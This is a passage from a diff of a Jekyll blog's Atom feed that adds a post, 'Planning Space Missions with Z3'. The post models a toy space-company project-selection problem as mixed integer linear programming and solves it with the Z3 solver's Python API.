@@ -1,4 +1,308 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.6">Jekyll</generator><link href="/book-of-gehn/feed.xml" rel="self" type="application/atom+xml" /><link href="/book-of-gehn/" rel="alternate" type="text/html" /><updated>2021-04-30T02:52:51+02:00</updated><id>/book-of-gehn/feed.xml</id><title type="html">The Book of Gehn</title><subtitle></subtitle><author><name>Gehn</name></author><entry><title type="html">Blending Whisky with Z3</title><link href="/book-of-gehn/articles/2021/04/29/Blending-Whisky.html" rel="alternate" type="text/html" title="Blending Whisky with Z3" /><published>2021-04-29T00:00:00+02:00</published><updated>2021-04-29T00:00:00+02:00</updated><id>/book-of-gehn/articles/2021/04/29/Blending-Whisky</id><content type="html" xml:base="/book-of-gehn/articles/2021/04/29/Blending-Whisky.html">&lt;p&gt;A whisky producer uses three kind of licor to make their whisky: &lt;script type=&quot;math/tex&quot;&gt;A&lt;/script&gt;,
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.6">Jekyll</generator><link href="/book-of-gehn/feed.xml" rel="self" type="application/atom+xml" /><link href="/book-of-gehn/" rel="alternate" type="text/html" /><updated>2021-05-03T00:57:21+02:00</updated><id>/book-of-gehn/feed.xml</id><title type="html">The Book of Gehn</title><subtitle></subtitle><author><name>Gehn</name></author><entry><title type="html">Planning Space Missions with Z3</title><link href="/book-of-gehn/articles/2021/05/02/Planning-Space-Missions.html" rel="alternate" type="text/html" title="Planning Space Missions with Z3" /><published>2021-05-02T00:00:00+02:00</published><updated>2021-05-02T00:00:00+02:00</updated><id>/book-of-gehn/articles/2021/05/02/Planning-Space-Missions</id><content type="html" xml:base="/book-of-gehn/articles/2021/05/02/Planning-Space-Missions.html">&lt;p&gt;A space company is planning the next 4 years. It has several projects,
+each one with its own budget requirement per year, but the company has a
+limited budget to invest.&lt;/p&gt;
+
+&lt;p&gt;Moreover, some projects &lt;em&gt;depends&lt;/em&gt; on others to make them feasible and
+some projects &lt;em&gt;cannot be done&lt;/em&gt; if other projects due unbreakable restrictions.&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Project&lt;/th&gt;
+      &lt;th&gt;1st&lt;/th&gt;
+      &lt;th&gt;2nd&lt;/th&gt;
+      &lt;th&gt;3rd&lt;/th&gt;
+      &lt;th&gt;4th&lt;/th&gt;
+      &lt;th&gt;Depends&lt;/th&gt;
+      &lt;th&gt;Not&lt;/th&gt;
+      &lt;th&gt;Profit&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;1 Cube-1 nano-sat&lt;/td&gt;
+      &lt;td&gt;1.1&lt;/td&gt;
+      &lt;td&gt;2&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt;12&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2 Cube-2 nano-sat&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt;2.5&lt;/td&gt;
+      &lt;td&gt;2&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt;12&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;3 Infrared sat&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt;1&lt;/td&gt;
+      &lt;td&gt;4.1&lt;/td&gt;
+      &lt;td&gt;on 6&lt;/td&gt;
+      &lt;td&gt;with 4&lt;/td&gt;
+      &lt;td&gt;18&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;4 Colored img sat&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt;2&lt;/td&gt;
+      &lt;td&gt;8&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt;with 3&lt;/td&gt;
+      &lt;td&gt;15&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;5 Mars probe&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt;2&lt;/td&gt;
+      &lt;td&gt;8&lt;/td&gt;
+      &lt;td&gt;4.4&lt;/td&gt;
+      &lt;td&gt;on 1 &amp;amp; 2&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt;12&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;6 Microwave tech&lt;/td&gt;
+      &lt;td&gt;4&lt;/td&gt;
+      &lt;td&gt;2.3&lt;/td&gt;
+      &lt;td&gt;2&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt;1&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;Under an incredible amount of assumptions and good luck, what is the
+best strategy to maximize the profit?&lt;!--more--&gt;&lt;/p&gt;
+
+&lt;p&gt;We can model if one project is make or not with a &lt;em&gt;boolean variable&lt;/em&gt;
+&lt;script type=&quot;math/tex&quot;&gt;P_i&lt;/script&gt;; we not longer are in the plane of &lt;em&gt;pure real linear
+programming&lt;/em&gt;.&lt;/p&gt;
+
+&lt;p&gt;The relation between the profit and them is simply:&lt;/p&gt;
+
+&lt;script type=&quot;math/tex; mode=display&quot;&gt;Z = max\{12 P_1 + 12 P_2 + 18 P_3 + 15 P_4 + 12 P_5 + 1 P_6 \}&lt;/script&gt;
+
+&lt;p&gt;But we have restriction on the budget per year. Let’s say 6 and let’s
+assume that the unspent budget of one year &lt;script type=&quot;math/tex&quot;&gt;B_j&lt;/script&gt; can be used the next one
+(and let’s assume that the unspent budget is not part of the profit).&lt;/p&gt;
+
+&lt;script type=&quot;math/tex; mode=display&quot;&gt;1.1 P_1 + 4   P_6 +     B_1                         = 6         \\
+2   P_1 + 2.5 P_2 + 2   P_5 + 2.3 P_6 +   B_2       = 6 + B_1   \\
+2   P_2 + 1   P_3 + 2   P_4 + 8   P_5 + 2 P_6 + B_3 = 6 + B_2   \\
+4.1 P_3 + 8   P_4 + 4.4 P_5 +     B_4               = 6 + B_3&lt;/script&gt;
+
+&lt;p&gt;This is &lt;em&gt;mixed linear programming&lt;/em&gt;: mixing integers (booleans) and real
+arithmetics.&lt;/p&gt;
+
+&lt;p&gt;The interesting part is how to model the restrictions between the
+projects using only integers/booleans.&lt;/p&gt;
+
+&lt;h2 id=&quot;boolean-theory-as-integer-linear-inequalities&quot;&gt;Boolean theory as integer linear inequalities&lt;/h2&gt;
+
+&lt;p&gt;The company could choose to do project 3 or project 4 but not both.&lt;/p&gt;
+
+&lt;p&gt;Becase all the variables &lt;script type=&quot;math/tex&quot;&gt;P_i&lt;/script&gt; can be 0 or 1, this is modeled as:&lt;/p&gt;
+
+&lt;script type=&quot;math/tex; mode=display&quot;&gt;% &lt;![CDATA[
+P_3 + P_4 &lt;= 1 %]]&gt;&lt;/script&gt;
+
+&lt;p&gt;In general, &lt;em&gt;zero or one&lt;/em&gt; restriction among &lt;script type=&quot;math/tex&quot;&gt;X_i&lt;/script&gt; is modeled as&lt;/p&gt;
+
+&lt;script type=&quot;math/tex; mode=display&quot;&gt;% &lt;![CDATA[
+\sum_{\forall i} X_i &lt;= 1 %]]&gt;&lt;/script&gt;
+
+&lt;p&gt;We can tweak this to make an &lt;em&gt;one and only one&lt;/em&gt; restriction
+(&lt;script type=&quot;math/tex&quot;&gt;\sum_{\forall i} X_i = 1&lt;/script&gt;), a &lt;em&gt;at least N&lt;/em&gt; restriction
+(&lt;script type=&quot;math/tex&quot;&gt;\sum_{\forall i} X_i &gt;= N&lt;/script&gt;),
+a &lt;em&gt;no more than N&lt;/em&gt; restriction (&lt;script type=&quot;math/tex&quot;&gt;% &lt;![CDATA[
+\sum_{\forall i} X_i &lt;= N %]]&gt;&lt;/script&gt;) and more.&lt;/p&gt;
+
+&lt;p&gt;In particular, the &lt;em&gt;at least 1&lt;/em&gt; is equivalent to do the boolean &lt;em&gt;or&lt;/em&gt;
+operation: &lt;script type=&quot;math/tex&quot;&gt;X_1 ∨ X_2 ∨ \dots ∨ X_n = Y&lt;/script&gt;&lt;/p&gt;
+
+&lt;p&gt;What about the dependency restrictions? Project 3 depends on 6 and
+project 5 depends on 1 and 2.&lt;/p&gt;
+
+&lt;script type=&quot;math/tex; mode=display&quot;&gt;% &lt;![CDATA[
+P_3 &lt;= P_6          \\
+2 P_5 &lt;= P_1 + P_2  \\ %]]&gt;&lt;/script&gt;
+
+&lt;p&gt;In general, a boolean variable &lt;script type=&quot;math/tex&quot;&gt;Y&lt;/script&gt; depends on &lt;script type=&quot;math/tex&quot;&gt;N&lt;/script&gt; boolean variables
+&lt;script type=&quot;math/tex&quot;&gt;X_i&lt;/script&gt;, then&lt;/p&gt;
+
+&lt;script type=&quot;math/tex; mode=display&quot;&gt;% &lt;![CDATA[
+N Y &lt;= \sum_{\forall i} X_i %]]&gt;&lt;/script&gt;
+
+&lt;p&gt;As before, we can tweak this to make a &lt;em&gt;depends on at least M&lt;/em&gt;
+restriction (&lt;script type=&quot;math/tex&quot;&gt;% &lt;![CDATA[
+M Y &lt;= \sum_{\forall i} X_i %]]&gt;&lt;/script&gt; with &lt;script type=&quot;math/tex&quot;&gt;% &lt;![CDATA[
+M &lt; N %]]&gt;&lt;/script&gt;).&lt;/p&gt;
+
+&lt;p&gt;A &lt;script type=&quot;math/tex&quot;&gt;Y&lt;/script&gt; depends on &lt;script type=&quot;math/tex&quot;&gt;X_i&lt;/script&gt; is weaker than &lt;script type=&quot;math/tex&quot;&gt;X_i ⟹  Y&lt;/script&gt; (in the
+former case, &lt;script type=&quot;math/tex&quot;&gt;Y&lt;/script&gt; may be false even of all the dependencies are
+satisfied).&lt;/p&gt;
+
+&lt;p&gt;An implication can be modeled as:&lt;/p&gt;
+
+&lt;script type=&quot;math/tex; mode=display&quot;&gt;% &lt;![CDATA[
+N Y &lt;= \sum_{\forall i} X_i &lt;= (N-1) + Y %]]&gt;&lt;/script&gt;
+
+&lt;p&gt;This last one can be seen as if &lt;strong&gt;all&lt;/strong&gt; the dependencies are set, &lt;script type=&quot;math/tex&quot;&gt;Y&lt;/script&gt;
+is set. In boolean terminology, this is an &lt;em&gt;and&lt;/em&gt;:
+&lt;script type=&quot;math/tex&quot;&gt;X_1 ∧ X_2 ∧ \dots ∧ X_n = Y&lt;/script&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;z3-time&quot;&gt;Z3 time!&lt;/h2&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;z3&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Bools&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Reals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Optimize&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Optimize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;P&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Bools&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'P0 P1 P2 P3 P4 P5 P6'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# P[0] will not be used
+&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;B&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Reals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'B0 B1 B2 B3 B4'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# B[0] will not be used
+&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;profit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;maximize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;P&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;P&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;18&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;P&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;P&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;P&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;P&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Variables &lt;code class=&quot;highlighter-rouge&quot;&gt;P[0]&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;B[0]&lt;/code&gt; are not used, they were created just to make
+the &lt;code class=&quot;highlighter-rouge&quot;&gt;P[i]&lt;/code&gt; notation to match with the inequalities of above.&lt;/p&gt;
+
+&lt;p&gt;However, I’m not going to let Z3 pick random values for them so I’m
+going to pin them:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;P&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;B&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The following is a 1-to-1 translation of the inequalities for the budget
+restrictions:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;     &lt;span class=&quot;mf&quot;&gt;1.1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;P&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;P&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;B&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;     &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;P&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;2.5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;P&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;P&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;2.3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;P&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;B&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;B&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;     &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;P&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;P&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;P&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;P&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;P&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;B&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;B&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;     &lt;span class=&quot;mf&quot;&gt;4.1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;P&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;P&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;4.4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;P&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;B&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;B&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now, I want to set the dependency and conflict restrictions in two
+different ways: using inequalities as described above and using Z3 high
+level abstraction to work with &lt;code class=&quot;highlighter-rouge&quot;&gt;Bools&lt;/code&gt; and its support for &lt;em&gt;boolean
+theories&lt;/em&gt;.&lt;/p&gt;
+
+&lt;p&gt;Because of this I’m going to preserve a copy of the current
+object &lt;code class=&quot;highlighter-rouge&quot;&gt;s&lt;/code&gt; to restore it later.&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;blockquote&gt;
